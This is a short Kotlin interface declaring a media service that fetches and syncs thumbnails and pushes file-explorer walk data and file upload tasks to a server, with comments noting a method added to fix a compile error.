package com.hawkshaw.library.datalayer.network.service

import com.hawkshaw.library.datalayer.models.*
import com.hawkshaw.library.datalayer.network.twirp.ApiResponse
import com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity // Added import for PushFileTaskEntity

/**
 * Service for handling media operations
 */
interface MediaService {
    /**
     * Get pending thumbnails from the server
     *
     * @return The response containing pending thumbnails
     */
    suspend fun getPendingThumbnails(): ApiResponse<GetPendingThumbnailsResponse>

    /**
     * Push file explorer walk data to the server
     *
     * @param request The file explorer walk data to push
     * @return The response from the server
     */
    suspend fun pushFileExplorerWalk(request: PushFileExplorerWalkRequest): ApiResponse<PushFileExplorerWalkResponse>

    /**
     * Push file explorer walk data to the server (V2)
     *
     * @param request The file explorer walk data to push
     * @return The response from the server
     */
    suspend fun pushFileExplorerWalkV2(request: PushFileExplorerWalkV2Request): ApiResponse<PushFileExplorerWalkV2Response>

    /**
     * Sync thumbnails with the server
     *
     * @return The response from the server
     */
    suspend fun syncThumbnails(): ApiResponse<SyncThumbnailsResponse>

    /**
     * Push a file upload task to the server.
     * This method is added to resolve the "Unresolved reference: pushFile" error.
     * It assumes the server responds with a generic Unit (no specific data) upon success.
     *
     * @param request The file task entity to push.
     * @return An ApiResponse indicating success, error, or in-progress status.
     */
    suspend fun pushFile(request: PushFileTaskEntity): ApiResponse<Unit> // Added this method
}
